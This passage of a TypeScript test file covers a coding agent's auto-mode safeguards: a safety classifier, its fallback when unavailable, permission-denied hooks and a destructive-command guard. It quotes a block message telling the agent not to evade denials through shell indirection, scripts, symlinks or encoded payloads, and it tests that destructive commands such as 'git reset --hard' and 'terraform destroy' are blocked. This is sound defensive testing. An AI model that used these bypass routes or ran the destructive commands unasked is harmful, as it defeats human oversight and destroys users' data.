      'Blocked by auto mode policy: Irreversible filesystem destruction\nDo not try to complete the denied action through another tool, shell indirection, generated script, alias, symlink, config change, hook, command file, MCP configuration, encoded payload, or equivalent path. To request manual approval for this exact action, retry the same tool call without changing its arguments. You may continue with unrelated safe work or a genuinely safer alternative that does not accomplish the denied action.',
    );
  });
});

describe('classifier unavailable confirmation', () => {
  it('renders a manual fallback message with the cause and recommendation', () => {
    expect(
      formatClassifierUnavailableFallbackMessage(
        verdict({
          stage: 'thinking',
          durationMs: 100,
          unavailable: true,
          reason: 'Conversation transcript exceeds classifier context window',
        }),
      ),
    ).toBe(
      "Auto Mode couldn't classify this action (Conversation transcript exceeds classifier context window). Review it manually. Switching to Default Mode is recommended if you want to continue without the classifier.",
    );
  });

  it('decorates the confirmation and suppresses persistent approval', () => {
    const confirmation = decorateAutoModeFallbackConfirmation(
      {
        type: 'exec',
        title: 'Run command',
        command: 'touch marker',
        rootCommand: 'touch',
        onConfirm: vi.fn(),
      },
      'classifier_unavailable',
      'Classifier unavailable.',
    );

    expect(confirmation).toMatchObject({
      hideAlwaysAllow: true,
      autoModeFallback: {
        reason: 'classifier_unavailable',
        message: 'Classifier unavailable.',
      },
    });
  });

  it('keeps the classifier-unavailable decorator compatible', () => {
    const confirmation = decorateClassifierUnavailableConfirmation(
      {
        type: 'info',
        title: 'Run tool',
        prompt: 'Run?',
        onConfirm: vi.fn(),
      },
      'Classifier unavailable.',
    );

    expect(confirmation.autoModeFallback?.reason).toBe(
      'classifier_unavailable',
    );
  });
});

// ─── PermissionDenied hook gating ────────────────────────────────────────

describe('PermissionDenied hook gating', () => {
  const classifierBlock = verdict({
    reason: 'Dangerous shell command',
    durationMs: 20,
  });

  it('fires for classifier policy blocks, including threshold fallbacks', () => {
    const fires = shouldFirePermissionDeniedForAutoMode;
    type Outcome = Parameters<typeof fires>[1];
    const review = (reason: string) =>
      ({ kind: 'fallback', reason, message: 'Review manually.' }) as Outcome;

    expect(
      fires(classifierBlock, {
        kind: 'blocked',
        errorMessage: 'blocked',
        reason: 'classifier_blocked',
      }),
    ).toBe(true);

    expect(
      fires({ ...classifierBlock, shouldBlock: false }, { kind: 'approved' }),
    ).toBe(false);

    expect(
      fires(
        { ...classifierBlock, unavailable: true },
        {
          kind: 'fallback',
          reason: 'classifier_unavailable',
          message: 'Classifier unavailable.',
        },
      ),
    ).toBe(false);

    expect(fires(classifierBlock, review('consecutive_block'))).toBe(true);

    expect(fires(classifierBlock, review('total_denial'))).toBe(true);

    expect(fires(classifierBlock, review('classifier_blocked_retry'))).toBe(
      false,
    );

    expect(
      fires(classifierBlock, { kind: 'fallback', reason: 'safety_check' }),
    ).toBe(false);

    expect(
      fires(
        { via: 'fallback', reason: 'safety_check' },
        { kind: 'fallback', reason: 'safety_check' },
      ),
    ).toBe(false);
  });

  it('maps classifier blocks to stable PermissionDenied reasons', () => {
    expect(getAutoModePermissionDeniedReason(classifierBlock)).toBe(
      'classifier_blocked',
    );

    expect(
      getAutoModePermissionDeniedReason({
        ...classifierBlock,
        unavailable: true,
      }),
    ).toBe('classifier_unavailable');
  });
});

// ─── shouldRunAutoModeForCall ─────────────────────────────────────────────

describe('shouldRunAutoModeForCall', () => {
  // Security-critical gate. Drift would either skip AUTO for tools that need it
  // (false negative: bypass) or classify tools that must always reach the user
  // (false positive: UX break for ask_user_question / exit_plan_mode).

  it('returns false when approval mode is not AUTO', () => {
    for (const mode of [
      ApprovalMode.DEFAULT,
      ApprovalMode.PLAN,
      ApprovalMode.AUTO_EDIT,
      ApprovalMode.YOLO,
    ]) {
      expect(shouldRunAutoModeForCall(mode, ToolNames.SHELL)).toBe(false);
    }
  });

  it('returns true for arbitrary tools when mode is AUTO', () => {
    for (const tool of [
      ToolNames.SHELL,
      ToolNames.EDIT,
      ToolNames.WRITE_FILE,
      ToolNames.WEB_FETCH,
      ToolNames.AGENT,
      ToolNames.SKILL,
      ToolNames.READ_FILE,
    ]) {
      expect(shouldRunAutoModeForCall(ApprovalMode.AUTO, tool)).toBe(true);
    }
  });

  const underAuto = (tool: string) =>
    shouldRunAutoModeForCall(ApprovalMode.AUTO, tool);

  it('excludes ASK_USER_QUESTION even under AUTO — must always reach the user', () => {
    expect(underAuto(ToolNames.ASK_USER_QUESTION)).toBe(false);
  });

  it('excludes EXIT_PLAN_MODE even under AUTO — plan exits are operator-driven', () => {
    expect(underAuto(ToolNames.EXIT_PLAN_MODE)).toBe(false);
  });

  it('excludes ENTER_PLAN_MODE even under AUTO — plan entries are always allowed without classification', () => {
    expect(underAuto(ToolNames.ENTER_PLAN_MODE)).toBe(false);
  });

  it('returns false for unknown tool names when not in AUTO', () => {
    expect(shouldRunAutoModeForCall(ApprovalMode.DEFAULT, 'unknown_tool')).toBe(
      false,
    );
  });
});

// ─── shouldClassifyAllShellForAutoMode ────────────────────────────────────

describe('shouldClassifyAllShellForAutoMode', () => {
  const classifiesAll = (tool: string, enabled: boolean) =>
    shouldClassifyAllShellForAutoMode(tool, {
      getAutoModeSettings: () => ({ classifyAllShell: enabled }),
    } as unknown as Config);

  it('returns true for Shell when classifyAllShell is enabled', () => {
    expect(classifiesAll(ToolNames.SHELL, true)).toBe(true);
  });

  it('returns true for Monitor when classifyAllShell is enabled', () => {
    expect(classifiesAll(ToolNames.MONITOR, true)).toBe(true);
  });

  it('returns false for Shell when classifyAllShell is disabled', () => {
    expect(classifiesAll(ToolNames.SHELL, false)).toBe(false);
  });

  it('returns false for non-shell tools even when classifyAllShell is enabled', () => {
    for (const tool of [
      ToolNames.EDIT,
      ToolNames.WRITE_FILE,
      ToolNames.READ_FILE,
      ToolNames.WEB_FETCH,
    ]) {
      expect(classifiesAll(tool, true)).toBe(false);
    }
  });

  it('returns false when classifyAllShell is undefined (default)', () => {
    const config = {
      getAutoModeSettings: () => ({}),
    } as unknown as Config;
    expect(shouldClassifyAllShellForAutoMode(ToolNames.SHELL, config)).toBe(
      false,
    );
  });
});

// ─── L5.2.5 destructive command guard integration ────────────────────────

describe('evaluateAutoMode — L5.2.5 destructive command guard', () => {
  const cwd = PROJECT;
  const shell = (command: string) => ({ toolName: ToolNames.SHELL, command });
  /** A Shell `command` evaluated after a user turn saying `prompt`. */
  const evaluateShell = (command: string, prompt: string) =>
    evaluate(shell(command), { messages: [userText(prompt)] });

  beforeEach(() => {
    clearSessionCommits();
  });

  it('blocks git reset --hard via shell tool before classifier', async () => {
    const decision = await evaluateShell('git reset --hard', 'fix the bug');
    expect(decision.via).toBe('blocked:destructive-command');
    if (decision.via === 'blocked:destructive-command') {
      expect(decision.reason).toContain('git reset --hard');
    }
  });

  it('blocks terraform destroy via shell tool', async () => {
    const decision = await evaluateShell('terraform destroy', 'update infra');
    expect(decision.via).toBe('blocked:destructive-command');
  });

  it('allows destructive commands when user explicitly mentions discard', async () => {
    // With "discard" in the prompt, the guard should NOT block. The call falls
    // through to the classifier (mocked away here — we only verify it is not
    // blocked:destructive-command).
    const decision = await evaluate(shell('git reset --hard'), {
      messages: [userText('discard all local changes and reset')],
      skipClassifierReason: 'total_denial',
    });
    // Should NOT be blocked:destructive-command; instead falls through
    // to fallback because we set skipClassifierReason.
    expect(decision.via).not.toBe('blocked:destructive-command');
  });

  it('preserves an armed retry when the destructive guard preempts it', async () => {
    const actionFingerprint = getAutoModeActionFingerprint(
      ToolNames.SHELL,
      { command: 'git reset --hard' },
      cwd,
    );
    let denialState = {
      ...counters(1, 0, 1, 0),
      pendingManualRetryFingerprint: actionFingerprint,
    };
    const config = {
      ...makeConfig([cwd]),
      getAutoModeDenialState: () => denialState,
      setAutoModeDenialState: (next: typeof denialState) => {
        denialState = next;
      },
    } as unknown as Config;
    const prepared = prepareAutoModeFallback(config, actionFingerprint);

    const decision = await evaluate(shell('git reset --hard'), {
      toolParams: { command: 'git reset --hard' },
      messages: [userText('fix the bug')],
      config,
      skipClassifierReason: prepared.fallback.fallback
        ? prepared.fallback.reason
        : undefined,
    });
    const outcome = applyAutoModeDecision(
      decision,
      config,
      prepared.denialState,
      actionFingerprint,
    );

    expect(outcome.kind).toBe('blocked');
    expect(denialState.pendingManualRetryFingerprint).toBe(actionFingerprint);
  });

  it('does not block non-shell tools', async () => {
    const decision = await evaluate(
      onFile(ToolNames.READ_FILE, '/any/file.txt'),
      { messages: [userText('read the file')] },
    );
    expect(decision.via).toBe('fast-path:allowlist');
  });

  it('blocks shell indirection: bash -c "git reset --hard"', async () => {
    const decision = await evaluateShell(
      'bash -c "git reset --hard"',
      'fix something',
    );
    expect(decision.via).toBe('blocked:destructive-command');
  });

  it('applyAutoModeDecision handles blocked:destructive-command', () => {
    const { result, setAutoModeDenialState } = apply(
      {
        via: 'blocked:destructive-command',
        reason: 'Blocked destructive git command',
      },
      counters(0, 0, 0, 0),
    );
    expect(result.kind).toBe('blocked');
    if (result.kind === 'blocked') {
      expect(result.errorMessage).toContain('Blocked destructive git command');
      expect(result.errorMessage).toContain('Do not try to complete');
      expect(result.errorMessage).not.toContain('retry the same tool call');
      expect(result.errorMessage).toContain(
        'ask the user for explicit approval',
      );
    }
    expect(setAutoModeDenialState).toHaveBeenCalled();
  });
});
